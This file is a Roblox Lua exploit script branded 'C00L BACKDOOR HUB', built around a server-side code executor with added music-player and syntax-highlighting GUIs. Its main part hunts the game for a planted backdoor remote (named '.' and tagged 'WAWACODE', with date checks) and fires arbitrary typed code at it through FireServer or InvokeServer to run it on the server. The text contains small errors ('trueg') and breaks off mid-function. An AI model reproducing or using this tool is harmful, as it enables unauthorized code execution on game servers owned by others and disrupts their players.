print([[C00L BACKDOOR HUB! 

 _______  _______  _______  ___                                          
|       ||  _    ||  _    ||   |                                         
|       || | |   || | |   ||   |                                         
|       || | |   || | |   ||   |                                         
|      _|| |_|   || |_|   ||   |___                                      
|     |_ |       ||       ||       |                                     
|_______||_______||_______||_______|                                     
 _______  _______  _______  _     _  __    _                             
|       ||       ||   _   || | _ | ||  |  | |                            
|  _____||    _  ||  |_|  || || || ||   |_| |                            
| |_____ |   |_| ||       ||       ||       |                            
|_____  ||    ___||       ||       ||  _    |                            
 _____| ||   |    |   _   ||   _   || | |   |                            
|_______||___|    |__| |__||__| |__||_|  |__|                            
 _______  _______  _______  ___   _  ______   _______  _______  ______   
|  _    ||   _   ||       ||   | | ||      | |       ||       ||    _ |  
| |_|   ||  |_|  ||       ||   |_| ||  _    ||   _   ||   _   ||   | ||  
|       ||       ||       ||      _|| | |   ||  | |  ||  | |  ||   |_||_ 
|  _   | |       ||      _||     |_ | |_|   ||  |_|  ||  |_|  ||    __  |
| |_|   ||   _   ||     |_ |    _  ||       ||       ||       ||   |  | |
|_______||__| |__||_______||___| |_||______| |_______||_______||___|  |_|
 __   __  __   __  _______                                               
|  | |  ||  | |  ||  _    |                                              
|  |_|  ||  | |  || |_|   |                                              
|       ||  |_|  ||       |                                              
|       ||       ||  _   |                                               
|   _   ||       || |_|   |                                              
|__| |__||_______||_______|                                              

]])

-- notifaction creator
function create(title,text)
	task.wait()
	game:GetService("StarterGui"):SetCore("SendNotification",{
		Title = title or "", -- Required
		Text = text or "", -- Required
		Icon = "" -- Optional
	})
end

local function assetloader(id)
	return id	
end

-- services
local TweenService = game:GetService("TweenService")
HttpService=game:GetService("HttpService")

-- just simple function to do ( "example" and etc)
function add(str,txt)
	return txt..str..txt
end


-- music list
local musiclist = {
	["Diamonds"]="rbxassetid://1846575559",
	["Lazy Sunday"]="rbxassetid://1842241530",
	["No More"]="rbxassetid://1846458016",
	["Roselita"]="rbxassetid://1838857104",
	["Solitaire"]="rbxassetid://1846457890",
	["Town Talk"]="rbxassetid://1845756489"
}

local musiclistbackup = {}
local plr = game.Players.LocalPlayer
local chr = plr.Character or plr.CharacterAdded:Wait()

for i,v in pairs(musiclist) do table.insert(musiclistbackup,i) end

-- strings
local playerstring = add(game.Players.LocalPlayer.Name,'"')


-- notifaction creator but better??
function create_withoptions(title,text, duration, btn1, btn2, callback)
	game:GetService("StarterGui"):SetCore("SendNotification",{
		Title = title or "", -- Required
		Text = text or "", -- Required
		Icon = "", -- Optional
		Duration = duration or 5,
		Callback = callback or nil,
		Button1 = btn1 or "", 
		Button2 = btn2 or "",
	})
end
-- syntax
local keywords = {
	lua = {
		"and", "break", "or", "else", "elseif", "if", "then", "until", "repeat", "while", "do", "for", "in", "end",
		"local", "return", "function", "export"
	},
	rbx = {
		"game", "workspace", "script", "math", "string", "table", "task", "wait", "select", "next", "Enum",
		"error", "warn", "tick", "assert", "shared", "loadstring", "tonumber", "tostring", "type",
		"typeof", "unpack", "print", "Instance", "CFrame", "Vector3", "Vector2", "Color3", "UDim", "UDim2", "Ray", "BrickColor",
		"OverlapParams", "RaycastParams", "Axes", "Random", "Region3", "Rect", "TweenInfo",
		"collectgarbage", "not", "utf8", "pcall", "xpcall", "_G", "setmetatable", "getmetatable", "os", "pairs", "ipairs"
	},
	operators = {
		"#", "+", "-", "*", "%", "/", "^", "=", "~", "=", "<", ">", ",", ".", "(", ")", "{", "}", "[", "]", ";", ":", "`"
	}
}

local colors = {
	numbers = Color3.fromRGB(255, 198, 0),
	boolean = Color3.fromRGB(214, 128, 23),
	operator = Color3.fromRGB(232, 210, 40),
	lua = Color3.fromRGB(160, 87, 248),
	rbx = Color3.fromRGB(146, 180, 253),
	str = Color3.fromRGB(56, 241, 87),
	comment = Color3.fromRGB(103, 110, 149),
	null = Color3.fromRGB(79, 79, 79),
	call = Color3.fromRGB(130, 170, 255),
	self_call = Color3.fromRGB(227, 201, 141),
	local_color = Color3.fromRGB(199, 146, 234),
	function_color = Color3.fromRGB(241, 122, 124),
	self_color = Color3.fromRGB(146, 134, 234),
	local_property = Color3.fromRGB(129, 222, 255),
}

local function createKeywordSet(keywords)
	local keywordSet = {}
	for _, keyword in ipairs(keywords) do
		keywordSet[keyword] = true
	end
	return keywordSet
end

local luaSet = createKeywordSet(keywords.lua)
local rbxSet = createKeywordSet(keywords.rbx)
local operatorsSet = createKeywordSet(keywords.operators)

local function getHighlight(tokens, index)
	local token = tokens[index]

	if colors[token .. "_color"] then
		return colors[token .. "_color"]
	end

	if tonumber(token) then
		return colors.numbers
	elseif token == "nil" then
		return colors.null
	elseif token:sub(1, 2) == "--" then
		return colors.comment
	elseif operatorsSet[token] then
		return colors.operator
	elseif luaSet[token] then
		return colors.rbx
	elseif rbxSet[token] then
		return colors.lua
	elseif token:sub(1, 1) == "\"" or token:sub(1, 1) == "\'" then
		return colors.str
	elseif token == "true" or token == "false" then
		return colors.boolean
	end

	if tokens[index + 1] == "(" then
		if tokens[index - 1] == ":" then
			return colors.self_call
		end

		return colors.call
	end

	if tokens[index - 1] == "." then
		if tokens[index - 2] == "Enum" then
			return colors.rbx
		end

		return colors.local_property
	end
end

function run(source)
	local tokens = {}
	local currentToken = ""

	local inString = false
	local inComment = false
	local commentPersist = false

	for i = 1, #source do
		local character = source:sub(i, i)

		if inComment then
			if character == "\n" and not commentPersist then
				table.insert(tokens, currentToken)
				table.insert(tokens, character)
				currentToken = ""

				inComment = false
			elseif source:sub(i - 1, i) == "]]" and commentPersist then
				currentToken ..= "]"

				table.insert(tokens, currentToken)
				currentToken = ""

				inComment = false
				commentPersist = false
			else
				currentToken = currentToken .. character
			end
		elseif inString then
			if character == inString and source:sub(i-1, i-1) ~= "\\" or character == "\n" then
				currentToken = currentToken .. character
				inString = false
			else
				currentToken = currentToken .. character
			end
		else
			if source:sub(i, i + 1) == "--" then
				table.insert(tokens, currentToken)
				currentToken = "-"
				inComment = true
				commentPersist = source:sub(i + 2, i + 3) == "[["
			elseif character == "\"" or character == "\'" then
				table.insert(tokens, currentToken)
				currentToken = character
				inString = character
			elseif operatorsSet[character] then
				table.insert(tokens, currentToken)
				table.insert(tokens, character)
				currentToken = ""
			elseif character:match("[%w_]") then
				currentToken = currentToken .. character
			else
				table.insert(tokens, currentToken)
				table.insert(tokens, character)
				currentToken = ""
			end
		end
	end

	table.insert(tokens, currentToken)

	local highlighted = {}

	for i, token in ipairs(tokens) do
		local highlight = getHighlight(tokens, i)

		if highlight then
			local syntax = string.format("<font color = \"#%s\">%s</font>", highlight:ToHex(), token:gsub("<", "&lt;"):gsub(">", "&gt;"))

			table.insert(highlighted, syntax)
		else
			table.insert(highlighted, token)
		end
	end

	return table.concat(highlighted)
end
-- end of syntax

local function creator_buttons(parent,list_buttons, function_buttons, IsAutomaticSized, onlyOneFunction)
	local buttons = list_buttons

	for i,v in pairs(buttons) do
		local temp = Instance.new("TextButton",parent)
		temp.Size = UDim2.new(1,0,0.2,0)
		temp.BackgroundColor3 = Color3.fromRGB(55,55,55)
		temp.TextColor3 = Color3.fromRGB(255,255,255)
		temp.TextTransparency = 0.65
		temp.TextXAlignment = Enum.TextXAlignment.Left
		temp.TextYAlignment = Enum.TextYAlignment.Top
		temp.Text = v
		temp.TextSize = 20
		temp.TextWrapped = true
		if IsAutomaticSized then
			if IsAutomaticSized==true then
				temp.AutomaticSize = Enum.AutomaticSize.Y
			end
		end
		
		if onlyOneFunction then
			temp.MouseButton1Click:Connect(function()
				onlyOneFunction(temp.Text)
			end)
		end
		
		temp.MouseButton1Click:Connect(function()
			if function_buttons then
				local find = function_buttons[temp.Text]
				if find then
					find()
				end
			end
		end)
	end

end
local interface = game.Players.LocalPlayer.PlayerGui
local function scroll_frame_template(frame)
	local scrollingframe = Instance.new("ScrollingFrame",frame)
	scrollingframe.Size = UDim2.new(1,0,1,0)
	scrollingframe.BackgroundTransparency = 1
	scrollingframe.CanvasSize = UDim2.new(0,0,0,0)
	scrollingframe.ScrollBarThickness = 2
	scrollingframe.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)

	local uilist = 	Instance.new("UIListLayout",scrollingframe)
	uilist.Padding = UDim.new(0,3)
	scrollingframe.AutomaticCanvasSize = Enum.AutomaticSize.Y
	scrollingframe.CanvasSize = UDim2.new(0,0,0,scrollingframe.UIListLayout.AbsoluteContentSize.Y)
	return scrollingframe
end

local function create_template(name)
	local plrGui_ = Instance.new("ScreenGui",interface)
	plrGui_.ResetOnSpawn = false
	plrGui_.IgnoreGuiInset = trueg
	plrGui_.Name = "farting few"

	local frame = Instance.new("Frame",plrGui_)
	frame.Size = UDim2.new(0.1,0,0.25,0)
	frame.BackgroundColor3 = Color3.fromRGB(45,45,45)
	frame.Position = UDim2.new(0.5,0,0.5,0)
	frame.AnchorPoint = Vector2.new(0.5,0.5)
	frame.Active = true
	frame.Draggable = true
	frame.Name = "Skibbity"

	closebutton(frame,plrGui_)
	hidebutton(frame,function()
		openbutton(name or "Template",frame)
	end)

	return frame
end
local r = nil

local list = Instance.new("ScreenGui",interface)
list.ResetOnSpawn = false
list.IgnoreGuiInset = true
list.Name = "HidedHub"
local hided = Instance.new("Frame",list)
hided.BackgroundTransparency = 1
hided.Size = UDim2.new(0.052,0,1,0)
hided.BackgroundColor3 = Color3.fromRGB(55,55,55)
hided.AnchorPoint = Vector2.new(0.5,0.5)
hided.Position = UDim2.new(0.95,0,0.5,0)

local uilist = Instance.new("UIListLayout",hided)
uilist.Padding = UDim.new(0,5)
uilist.VerticalAlignment = Enum.VerticalAlignment.Center
uilist.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- creates open button
function openbutton(name,frame)
	local create_openbutton = Instance.new("TextButton",hided)
	create_openbutton.Size = UDim2.new(1,0,0.07,0)
	create_openbutton.BackgroundColor3 = Color3.fromRGB(55,55,55)
	create_openbutton.TextColor3 = Color3.fromRGB(255,255,255)
	create_openbutton.TextTransparency = 0.65
	create_openbutton.TextXAlignment = Enum.TextXAlignment.Center
	create_openbutton.Text = "Open ".. name
	create_openbutton.Name = name
	create_openbutton.AnchorPoint = Vector2.new(0.5,0.5)
	create_openbutton.Position = UDim2.new(0.95,0,0.5,0)
	create_openbutton.TextScaled = true

	local imagelabel = Instance.new("ImageLabel",create_openbutton)
	imagelabel.Size = UDim2.new(1,0,1,0)
	imagelabel.BackgroundTransparency = 1
	imagelabel.Image = "rbxassetid://74595603256262"
	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
	imagelabel.ScaleType = Enum.ScaleType.Fit
	imagelabel.ImageTransparency = 0.9

	create_openbutton.MouseButton1Click:Connect(function()
		frame.Visible = true
		create_openbutton:Destroy()
	end)
	frame.Visible = false

	return create_openbutton
end

-- creates hide button
function hidebutton(parent,func)
	local hasfunction = false
	if func then
		hasfunction = true
	end

	local hidebtn = Instance.new("TextButton",parent)
	hidebtn.Size = UDim2.new(0.15,0,0.07,0)
	hidebtn.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
	hidebtn.TextColor3 = Color3.fromRGB(255,255,255)
	hidebtn.TextScaled = true
	hidebtn.Text = "-"
	hidebtn.Position = UDim2.new(0.83,0,-0.07,0)
	hidebtn.AnchorPoint = Vector2.new(0.5,0.5)
	hidebtn.MouseButton1Click:Connect(function()
		if hasfunction==true then
			func()
		end
	end)

	return hidebtn
end

-- create close button
function closebutton(parent,closes_what, func)
	closes_what = closes_what or parent
	local hasfunction = false
	if func then
		hasfunction = true
	end
	local closebtn = Instance.new("TextButton",parent)
	closebtn.Size = UDim2.new(0.15,0,0.07,0)
	closebtn.BackgroundColor3 = Color3.fromRGB(140, 63, 64)
	closebtn.TextColor3 = Color3.fromRGB(255,255,255)
	closebtn.TextScaled = true
	closebtn.Text = "X"
	closebtn.Position = UDim2.new(1,0,-0.07,0)
	closebtn.AnchorPoint = Vector2.new(0.5,0.5)
	closebtn.MouseButton1Click:Connect(function()
		if hasfunction==true then
			func()
		end
		closes_what:Destroy()
	end)
end

-- creates frame template
local function frame_template(parent,size,color,position,anchor,active,draggable,clips)
	local frame = Instance.new("Frame",parent)
	frame.Size = size or UDim2.new(0.25,0,0.25,0)
	frame.BackgroundColor3 = color or Color3.fromRGB(45,45,45)
	frame.Position = position or UDim2.new(0.5,0,0.5,0)
	frame.AnchorPoint = anchor or Vector2.new(0.5,0.5)
	frame.Active = active or true
	frame.Draggable = draggable or true
	frame.ClipsDescendants = clips or false

	return frame
end

-- music folder
local music_alpha = Instance.new("Folder",workspace)
music_alpha.Name = "MusicAlpha"

-- music sound 
function get_music()
	music_alpha:ClearAllChildren()
	local list1 = {}
	local list2 = {}
	for i,v in pairs(musiclist) do
		table.insert(list1,v)
		table.insert(list2,i)
	end
	local index_choice = math.random(1,#list1)
	local sfx = Instance.new("Sound",music_alpha)
	sfx.SoundId = list1[index_choice]
	return sfx, list2[index_choice]
end

function Format(Int)
	return string.format("%02i", Int)
end

function convertToMS(Seconds)
	local Minutes = (Seconds - Seconds%60)/60
	Seconds = Seconds - Minutes*60
	local Hours = (Minutes - Minutes%60)/60
	Minutes = Minutes - Hours*60
	return Format(Minutes)..":"..Format(Seconds)
end


-- music player
local function music_creator()
	local hided = false
	local ff = interface:FindFirstChild("SBPlayer")
	if ff then
		ff:Destroy()
	end
	local loopfunction
	local sfx, title = get_music()
	print(sfx,title)
	local creategui = Instance.new("ScreenGui",interface)
	creategui.ResetOnSpawn = false
	creategui.IgnoreGuiInset = true
	creategui.Name = "SBPlayer"

	local function change()
		sfx, title = get_music()
	end

	local function gettitleoutofid(sfx)
		for i,v in pairs(musiclist) do
			if v == sfx.SoundId then
				return v
			end
		end
	end

	local function getidoutoftitle(titls)
		for i,v in pairs(musiclist) do
			if v == titls then
				return v
			end
		end
	end

	local function titletonumber(titls)
		local back = musiclistbackup
		for i,v in pairs(back) do
			if v == titls then
				return i
			end
		end
	end


	local function changeto(num)		
		local backup = musiclistbackup
		print(backup)
		print(musiclistbackup[num])
		title = musiclistbackup[num]
		sfx.SoundId = musiclist[title]
		sfx.TimePosition = 0

		if hided==true then
			create("Music player","Now Playing: "..title.."\n Next Up: ".. musiclistbackup[num+1] or musiclistbackup[1])
		end
	end
	local txtlabeltitle = nil
	local txtlabeltitle2_effect = nil
	local txtlabeltitle3_effect = nil
	local backup_position = nil
	local delayer = false
	local spawnimage = nil
	local function moved()
		delayer = true
		task.delay(0.2,function()
			delayer = false
			txtlabeltitle.Position = backup_position
		end)
	end

	local function nexth()
		if delayer==true then return end
		local num = titletonumber(title)
		if num+1 > #musiclistbackup then
			num = 1
		else
			num = num+1
		end
		TweenService:Create(txtlabeltitle,TweenInfo.new(0.2),{Position = txtlabeltitle.Position - UDim2.new(1,0,0,0)}):Play()
		txtlabeltitle2_effect.Text = "Current Music: ".. musiclistbackup[num]
		game.TweenService:Create(spawnimage,TweenInfo.new(0.2),{Rotation = spawnimage.Rotation+50}):Play()
		moved()
		changeto(num)
	end
	local function previous()
		if delayer==true then return end
		local num = titletonumber(title)
		if num-1 <= 0 then
			num = #musiclistbackup
		else
			num = num-1
		end
		TweenService:Create(txtlabeltitle,TweenInfo.new(0.2),{Position = txtlabeltitle.Position + UDim2.new(1,0,0,0)}):Play()
		txtlabeltitle3_effect.Text = "Current Music: ".. musiclistbackup[num]

		game.TweenService:Create(spawnimage,TweenInfo.new(0.2),{Rotation = spawnimage.Rotation-50}):Play()

		moved()
		changeto(num)
	end


	local function update(titletxt, timer, bar)
		titletxt.Text = "Current Music: ".. title
		timer.Text = convertToMS(sfx.TimePosition) .."/"..convertToMS(sfx.TimeLength)
		bar.Size = UDim2.new(sfx.TimePosition/sfx.TimeLength,0,1,0)
	end

	local frame = frame_template(creategui,UDim2.new(0.3,0,0.3,0))
	local xbutton = closebutton(frame,creategui,function()
		loopfunction:Disconnect()
		music_alpha:ClearAllChildren()
	end)
	local hide = hidebutton(frame,function()
		hided = true
		openbutton("music player", frame)
		frame.Visible = false
	end)

	frame:GetPropertyChangedSignal("Visible"):Connect(function()
		if frame.Visible == true then
			hided = false
		end
	end)

	local line = Instance.new("CanvasGroup",frame)
	line.AnchorPoint = Vector2.new(0.5,0.5)
	line.Size = UDim2.new(0.9,0,0.05,0)
	line.Position = UDim2.new(0.5,0,0.88,0)
	line.BackgroundColor3 = Color3.fromRGB(156, 156, 156)
	line.ClipsDescendants = true

	local framebox = Instance.new("Frame",frame)
	framebox.BackgroundTransparency = 1
	framebox.Size = UDim2.new(1,0,0.1,0)
	framebox.Position = UDim2.new(0,0,0.035,0)
	framebox.ClipsDescendants = true

	txtlabeltitle = Instance.new("TextLabel",framebox)
	txtlabeltitle.TextScaled = true
	txtlabeltitle.BackgroundTransparency = 1
	txtlabeltitle.Text = "Current Music: idkkk"
	txtlabeltitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	txtlabeltitle.Size = UDim2.new(1,0,1,0)
	txtlabeltitle.Position = UDim2.new(0,0,0,0)
	txtlabeltitle.Text = "Current Music: ".. title

	txtlabeltitle2_effect = Instance.new("TextLabel",txtlabeltitle)
	txtlabeltitle2_effect.BackgroundTransparency = 1
	txtlabeltitle2_effect.TextStrokeTransparency = 0.5
	txtlabeltitle2_effect.TextColor3 = Color3.fromRGB(255, 255, 255)
	txtlabeltitle2_effect.Size = UDim2.new(1,0,1,0)
	txtlabeltitle2_effect.Position = UDim2.new(1,0,0,0)
	txtlabeltitle2_effect.Text = "right"
	txtlabeltitle2_effect.TextScaled = true

	txtlabeltitle3_effect = Instance.new("TextLabel",txtlabeltitle)
	txtlabeltitle3_effect.BackgroundTransparency = 1
	txtlabeltitle3_effect.TextStrokeTransparency = 0.5
	txtlabeltitle3_effect.TextColor3 = Color3.fromRGB(255, 255, 255)
	txtlabeltitle3_effect.Size = UDim2.new(1,0,1,0)
	txtlabeltitle3_effect.Position = UDim2.new(-1,0,0,0)
	txtlabeltitle3_effect.Text = "left"
	txtlabeltitle3_effect.TextScaled = true

	backup_position = txtlabeltitle.Position
	local function btn(pos)
		local btn = Instance.new("TextButton",frame)
		btn.BackgroundTransparency = 0.15
		btn.BackgroundColor3 = Color3.fromRGB(185, 185, 185)
		btn.Size = UDim2.new(0.1,0,0.1,0)
		btn.Position = pos
		btn.Text = ""
		btn.AnchorPoint = Vector2.new(0.5,0.5)
		btn.TextScaled = true
		btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		return btn
	end

	local playbutton = btn(UDim2.new(0.5,0,0.75,0))
	playbutton.Text="►"
	playbutton.MouseButton1Click:Connect(function()
		if playbutton.Text=="►" then
			sfx:Pause()
			playbutton.Text="■"
		else
			sfx:Resume()
			playbutton.Text="►"
		end
	end)

	local nextbutton = btn(UDim2.new(0.6,0,0.75,0))
	nextbutton.Text=">>"
	nextbutton.MouseButton1Click:Connect(function()
		nexth()
	end)
	local prevbutton = btn(UDim2.new(0.4,0,0.75,0))
	prevbutton.Text="<<"
	prevbutton.MouseButton1Click:Connect(function()
		previous()
	end)

	sfx.Ended:Connect(function()
		nexth()
		sfx:Resume()
	end)

	sfx:Resume()
	local txtlabeltimer = Instance.new("TextLabel",line)
	txtlabeltimer.TextScaled = true
	txtlabeltimer.BackgroundTransparency = 1
	txtlabeltimer.Text = "0:00 / 0:00"
	txtlabeltimer.TextColor3 = Color3.fromRGB(255, 255, 255)
	txtlabeltimer.Size = UDim2.new(1,0,1,0)
	txtlabeltimer.ZIndex = 8
	local bar = Instance.new("Frame",line)
	bar.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
	bar.Size = UDim2.new(0,0,1,0)
	bar.Position = UDim2.new(0,0,0,0)
	bar.BorderSizePixel = 0
	bar.Size = UDim2.new(sfx.TimePosition/sfx.TimeLength,0,1,0)

	local change_time = Instance.new("TextButton",line)
	change_time.BackgroundTransparency = 1
	change_time.Text = ""
	change_time.Size = UDim2.new(1,0,1,0)
	change_time.Position = UDim2.new(0.5,0,0.5,0)
	change_time.AnchorPoint = Vector2.new(0.5,0.5)	
	change_time.ZIndex = 5
	change_time.MouseButton1Click:Connect(function()
		local mouse = game.Players.LocalPlayer:GetMouse()
		local mouse_x = mouse.X
		local x = mouse_x - line.AbsolutePosition.X
		local m = x*sfx.TimeLength/line.AbsoluteSize.X
		sfx.TimePosition=m
	end)

	local bars_framelayer1 = Instance.new("Frame",frame)
	bars_framelayer1.Size = UDim2.new(0.85,0,0.45,0)
	bars_framelayer1.Position = UDim2.new(0.5,0,0.45,0)
	bars_framelayer1.AnchorPoint = Vector2.new(0.5,0.5)
	bars_framelayer1.BackgroundTransparency = 1


	local bars_frame = Instance.new("Frame",bars_framelayer1)
	bars_frame.Size = UDim2.new(1,0,1,0)
	bars_frame.BackgroundTransparency = 1

	local uilist = Instance.new("UIListLayout",bars_frame)
	uilist.FillDirection = Enum.FillDirection.Horizontal
	uilist.HorizontalAlignment = Enum.HorizontalAlignment.Center

	local amountofbars = 13
	bars_frame.ClipsDescendants = true
	uilist.Padding=UDim.new(0,amountofbars/2)

	local bars = {}

	for i = 1, amountofbars do
		local bar = Instance.new("Frame",bars_frame)

		table.insert(bars,bar)
		bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
		bar.BorderSizePixel = 0
		bar.Size = UDim2.new(0.05,0,0.5,0)
		bar.Name = i
		bar.ZIndex = 5
	end
	bars_frame.Rotation = 180
	local sizes = {}
	for i, bar in ipairs(bars) do
		sizes[i] = 0
	end

	local uicorner = Instance.new("UICorner",line)
	uicorner.CornerRadius = UDim.new(1,0)

	local uicorner = Instance.new("UICorner",bar)
	uicorner.CornerRadius = UDim.new(1,0)


	local imagelabel = Instance.new("ImageLabel",bars_framelayer1)
	imagelabel.Size = UDim2.new(1,0,1,0)
	imagelabel.BackgroundTransparency = 1
	imagelabel.Image = "rbxassetid://74595603256262"
	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
	imagelabel.ScaleType = Enum.ScaleType.Fit
	imagelabel.ImageTransparency = 0.8
	spawnimage = imagelabel
	loopfunction = game["Run Service"].RenderStepped:Connect(function()
		if delayer==false then
			imagelabel.Rotation += 0.1
		end
		local amplitude = sfx.PlaybackLoudness / 3
		-- loop all bars
		for i, bar in ipairs(bars) do
			-- get a random offset for each bar
			local randomOffset = math.random() * amplitude 
			-- tween the size towards the new size
			sizes[i] += (amplitude + randomOffset - sizes[i]) * 0.2
			-- set the bars size
			bar.Size = UDim2.new(0.05, 0, 0, sizes[i])
		end

		update(txtlabeltitle, txtlabeltimer,bar)

	end)

	sfx:Play()
end

-- SS executor creator
local function gui_create()	
	if r==nil then
		create("Error!","Remote not found, try to find again!")
		return
	end
	local plrGui_ = Instance.new("ScreenGui",interface)
	plrGui_.ResetOnSpawn = false
	plrGui_.IgnoreGuiInset = true
	plrGui_.Name = "SBExecutor"

	local frame = Instance.new("Frame",plrGui_)
	frame.Size = UDim2.new(0.25,0,0.25,0)
	frame.BackgroundColor3 = Color3.fromRGB(45,45,45)
	frame.Position = UDim2.new(0.5,0,0.5,0)
	frame.AnchorPoint = Vector2.new(0,0)
	frame.Active = true
	frame.Draggable = true
	frame.ClipsDescendants = false
	local scrollingframe = Instance.new("ScrollingFrame",frame)
	scrollingframe.Size = UDim2.new(1,0,.75,0)
	scrollingframe.BackgroundTransparency = 1
	scrollingframe.CanvasSize = UDim2.new(0,0,0,0)
	scrollingframe.ScrollBarThickness = 2
	scrollingframe.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)

	local textbox = Instance.new("TextBox",scrollingframe)
	textbox.Text = ""
	textbox.PlaceholderText = ""
	textbox.BackgroundColor3 = Color3.fromRGB(30,30,30)
	textbox.BorderSizePixel = 0
	textbox.TextColor3 = Color3.fromRGB(255,255,255)
	textbox.TextTransparency = 0.65
	textbox.TextXAlignment = Enum.TextXAlignment.Left
	textbox.TextYAlignment = Enum.TextYAlignment.Top
	textbox.TextSize = 20
	textbox.MultiLine = true
	textbox.TextWrapped = true
	textbox.Size = UDim2.new(1,0,1,0)
	textbox.AutomaticSize = Enum.AutomaticSize.Y

	local txt = Instance.new("TextLabel",textbox)
	txt.Text = ""
	txt.BackgroundTransparency = 1
	txt.TextColor3 = Color3.fromRGB(255,255,255)
	txt.TextXAlignment = Enum.TextXAlignment.Left
	txt.TextYAlignment = Enum.TextYAlignment.Top
	txt.TextSize = 20
	txt.RichText = true
	txt.TextWrapped = true
	txt.Size = UDim2.new(1,0,1,0)
	txt.ZIndex = 2
	textbox.ClearTextOnFocus = false
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		txt.Text = run(textbox.Text)
		scrollingframe.CanvasSize = UDim2.new(0,0,0,txt.TextBounds.Y+40)
	end)

	local textButton = Instance.new("TextButton",frame)
	textButton.Text = "Execute"
	textButton.BackgroundColor3 = Color3.fromRGB(37, 65, 38)
	textButton.Size = UDim2.new(0.35,0,0.2,0)
	textButton.TextColor3 = Color3.fromRGB(255,255,255)
	textButton.Position = UDim2.new(0.015,0,.7+textButton.Size.Y.Scale/2.6,0)
	textButton.TextScaled = true

	local syntaxenable = Instance.new("TextButton",frame)
	syntaxenable.Text = "Syntax: T"
	syntaxenable.BackgroundColor3 = Color3.fromRGB(123, 47, 186)
	syntaxenable.Size = UDim2.new(0.15,0,0.2,0)
	syntaxenable.TextColor3 = Color3.fromRGB(255,255,255)
	syntaxenable.Position = UDim2.new(0.42,0,.7+syntaxenable.Size.Y.Scale/2.6,0)
	syntaxenable.TextScaled = true
	syntaxenable.MouseButton1Click:Connect(function()
		if syntaxenable.Text == "Syntax: F" then
			syntaxenable.Text = "Syntax: T"
			txt.Visible = true
			textbox.TextTransparency = 0.65
		else
			syntaxenable.Text = "Syntax: F"
			txt.Visible = false
			textbox.TextTransparency = 0
		end
	end)

	textButton.MouseButton1Click:Connect(function()
		runRemote(r,textbox.Text)
		textButton.Text = "Executed!"
		task.wait(0.25)
		textButton.Text = "Execute"
	end)

	closebutton(frame,plrGui_)

	local clear = Instance.new("TextButton",frame)
	clear.Text = "Clear"
	clear.BackgroundColor3 = Color3.fromRGB(65, 27, 28)
	clear.Size = UDim2.new(0.15,0,0.2,0)
	clear.TextColor3 = Color3.fromRGB(255,255,255)
	clear.Position = UDim2.new(0.63,0,.7+clear.Size.Y.Scale/2.6,0)
	clear.TextScaled = true

	local resize = Instance.new("TextButton",frame)
	resize.Text = "Resize"
	resize.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
	resize.Size = UDim2.new(0.15,0,0.2,0)
	resize.TextColor3 = Color3.fromRGB(255,255,255)
	resize.Position = UDim2.new(0.83,0,.7+clear.Size.Y.Scale/2.6,0)
	resize.TextScaled = true

	clear.MouseButton1Click:Connect(function() 
		clear.Text = "Cleared!"
		textbox.Text = ""
		task.wait(0.25)
		clear.Text = "Clear"
	end)

	return plrGui_
end
-- Data creator for detecting fresh backdoors
local setter = Instance.new("BoolValue",workspace)
setter.Name = "Data"

setter:SetAttribute("Day",os.date("%A"))
setter:SetAttribute("Month",os.date("%B"))
setter:SetAttribute("Years",os.date("%Y"))
local detect = os.date("%A")
local weekend = false
if detect == "Sunday" or detect == "Saturday" or detect == "Friday" then
	weekend = true
else
	weekend = false
end

-- backdoor finding (may not good)
local code

alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
function generateName(lenght)

	local text=''

	for i=1,lenght do
		text=text..alphabet[math.random(1,#alphabet)]
	end

	return text

end

function runRemote(remote:Instance,func)
	if remote:IsA("RemoteEvent") then
		remote:FireServer(func)
	elseif remote:IsA("RemoteFunction") then
		spawn(function()
			remote:InvokeServer(func)
		end)
	end
end

remotes = nil

local function filterRemote(r, remotes)
	if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
		table.insert(remotes, r);
	end
end

local function getRemotes()
	local remotes = {};
	for i, r in ipairs(game:GetDescendants()) do
		filterRemote(r, remotes);
	end;
	-- check getnilinstances support
	if getnilinstances == nil then
		return remotes;
	end
	for i, r in ipairs(getnilinstances()) do
		filterRemote(r, remotes);
	end;
	return remotes;
end;

local function find()
	local word_generation = ""

	word_generation = alphabet[math.random(1,#alphabet)]
	for i=1,5 do
		word_generation=word_generation..tostring(math.random(0,16))
	end
	word_generation = tostring(word_generation)
	local timee=os.clock()

	local finds =  nil

	local foundas = true

	for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
		task.wait()
		if v.Name == "." then
			finds = v
			break
		end
	end

	if finds == nil then
		create("Error!", "Remote Event/Function is NOT found in this game. Backdoor will not work here. Sorry! D:")
		foundas = false
	end
	if foundas == true then
		if finds:GetTags()[1] == "WAWACODE" then
			if finds:GetAttribute("Day")==setter:GetAttribute("Day")
				and finds:GetAttribute("Month")==setter:GetAttribute("Month")
				and finds:GetAttribute("Years")==setter:GetAttribute("Years")
				and finds:GetAttribute("IsWeekend")==weekend then
				r = finds
				foundas = true
			else
				local day,month,year,weekend = finds:GetAttribute("Day"),finds:GetAttribute("Month"),finds:GetAttribute("Years"),find:GetAttribute("Weekend")
				create("Error!", "Date you entered not match. Please rejoin to fresh new server. More info: "..day.."/"..month.."/"..year..". Weekend: "..tostring(weekend)..". Backdoor will not work here. Sorry! D:")
				foundas = false
			end
		else

			local found = false
			local obj = nil
			for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
				task.wait()
				if v.Name == "." and v:GetTags()[1] == "WAWACODE" then
					found = true
					obj = v
					break
				end
